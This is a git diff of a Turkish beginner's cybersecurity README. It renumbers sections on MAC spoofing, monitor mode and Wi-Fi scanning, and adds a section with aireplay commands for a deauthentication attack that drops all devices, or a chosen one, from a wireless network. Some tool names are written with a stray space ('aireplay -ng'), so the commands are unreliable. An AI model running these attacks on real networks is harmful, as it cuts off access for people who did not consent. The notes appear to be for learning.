@@ -1,13 +1,13 @@
 # Cyber Security
-- [VPN DNS MAC](#VPN-DNS-MAC)
-- [Monitör Mod ve Manage Mod](#Monitör-Mod-ve-Manage-Mod)
-- [Çevredeki Modemleri Bulma](#Çevredeki-Modemleri-Bulma)
+- [1-VPN DNS MAC](#1-VPN-DNS-MAC)
+- [2-Monitör Mod ve Manage Mod](#2-Monitör-Mod-ve-Manage-Mod)
+- [3-Çevredeki Modemleri Bulma](#3-Çevredeki-Modemleri-Bulma)
+- [4-Deauth Saldırısı Yapma](#Deauth-Saldırısı-Yapma)
 
 
 
 
-
-# VPN DNS MAC 
+# 1-VPN DNS MAC 
 
 VPN (Virtual Personal Network)
 
@@ -48,7 +48,7 @@ ifconfig wlan hw ether XX:XX:XX:XX:XX:XX  İstediğimiz MAC adresini yapmamızı
 ifconfig wlan0 up
 ```
 
-# Monitör Mod ve Manage Mod
+# 2-Monitör Mod ve Manage Mod
 
 - wifi adaptörümüzü bilgisayarımıza bağlıyoruz, daha sonra kalimizi monitör moda almamız gerekiyor
 
@@ -67,7 +67,7 @@ ifconfig wlan0 mode monitor
 ifconfig wlan0 up
 ```
 
-# Çevredeki Modemleri Bulma
+# 3-Çevredeki Modemleri Bulma
 
 ```airopdump -ng wlan0mon``` -> Çevredeki Modemleri Bulur
 
@@ -78,4 +78,28 @@ ifconfig wlan0 up
 * Data -> O ağa kaç cihazın bağlı olduğunu gösterir
 * CH -> Hangi kanalda olduğunu gösterir
 * ENC -> Şifreleme işlemi bilgisi
+```
+
+# 4-Deauth Saldırısı Yapma
+
+### Ağdaki Cihazların MAC Adreslerini Görme
+```
+airodump -ng --channel X (kanal numarası) --bssid XX:XX:XX:XX:XX:XX (MAC adresi) --write airodumptest (Sonuçları yazdıracağımız 
+dosya adı) wlan0
+```
+### Ağdaki Cihazlara Deauth Saldırısı Yapma
+> ### Ağdaki Bütün Cihazlara Saldırı
+```
+aireplay -ng --deauth A -a XX:XX:XX:XX:XX:XX wlan0mon
+```
+
+> ### Ağdaki Belirli Cihaza Saldırı
+```
+aireplay -ng --deauth A -a XX:XX:XX:XX:XX:XX -c YY:YY:YY:YY:YY:YY wlan0mon
+```
+
+```
+* A: Gönderilecek paket sayısı, sayı büyüdükçe ağda düşme süresi artar
+* -a:  Ağın MAC adresi
+* -c:  Saldırı Yapılacak Cihazın MAC adresi
 ```
